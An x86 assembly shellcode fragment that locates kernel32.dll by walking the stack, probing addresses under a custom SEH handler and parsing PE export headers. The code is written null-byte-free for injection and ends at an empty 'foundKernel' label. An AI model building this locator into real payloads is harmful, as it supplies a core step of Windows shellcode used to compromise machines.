; Author: Tarek Ahmed
; All rights reserved
; Email: unix.geek2014@gmail.com


sub esp, 08h
xor eax, eax
cdq
xchg edx, ecx


StackWalk :
	mov ebx, [esp + ecx]	; We walk down our Stack and all the previous stacks as well starting from 0
	mov edx, ebx
	shr ebx, 28		; Get the first byte in address E.g 0x71234343 --> 0x00000007
	add ecx, 4
	cmp ebx, 07h		
	jne StackWalk




checking:

	mov [ebp-0ch], ecx
	push edx
	call checkAddress	; Check if the address is valid first using SEH custom function
	cmp eax, 0		; If the result of the function is zero, then it's valid
	je valid
	mov ecx, [ebp-0ch]
	jmp short StackWalk


valid :
	mov ecx, [ebp-0ch]
	mov ax, 1001h
	add eax, 0efffh

	sub edx, eax		; Subtracting 0x10000 from the address to get the base


	mov dx, ax


	xchg edx, ebx
	mov ax, [ebx]
	cmp ax, 5a4dh		; Check if the address starts with two bytes "MZ"
	jne StackWalk
	mov edi, [ebx + 3ch]	; Walking the PE file
	add edi, ebx
	mov edi, [edi + 78h]
	add edi, ebx
	mov edi, [edi + 0ch]
	add edi, ebx
	add edi, 04h

	xor eax, eax
	push eax
	push 6c6c642eh;.dll	; Check only the string el32.dll, short for kernel32.dll. Unless there is another dll file with this name.
	push 32334c45h; EL32
	mov esi, esp

checkKernel :
	mov edx, ecx
	mov ecx, 8
	cld

	repe cmpsb		; Compare nel32.dll to the PE string.
	cmp ecx, 0
	je foundKernel
	mov ecx, edx
	jmp StackWalk		; If not, then it's not kernel32, jmp back to StackWalk and repeat.

; jmp brute


; Exception Handler function

checkAddress :
	push ebp
	mov ebp, esp
	jmp rev1	
	reverse:		
	pop eax
	jmp eax
	rev1:
	call reverse		; This line is getting the address of next instruction, but I do it this way to avoid null bytes because it jumps backward.
	add eax, 1eh
	push eax
	xor edi, edi
	push dword ptr FS : [edi]
	mov dword ptr fs : [edi] , esp
	mov eax, dword ptr ss : [ebp + 8]
	mov eax, dword ptr ds : [eax] ; is EAX valid ?

	xor eax, eax; Return 0 if no exception.

	jmp short cleanup

	; Exception handler entry point
	xor eax, eax
	inc eax		; return 1 because of the exception
	mov esp, dword ptr fs : [edi]
	mov esp, dword ptr ss : [esp]


cleanup :
	pop dword ptr fs : [edi]
	add esp, 4
	pop ebp
	retn 4

foundKernel :
	
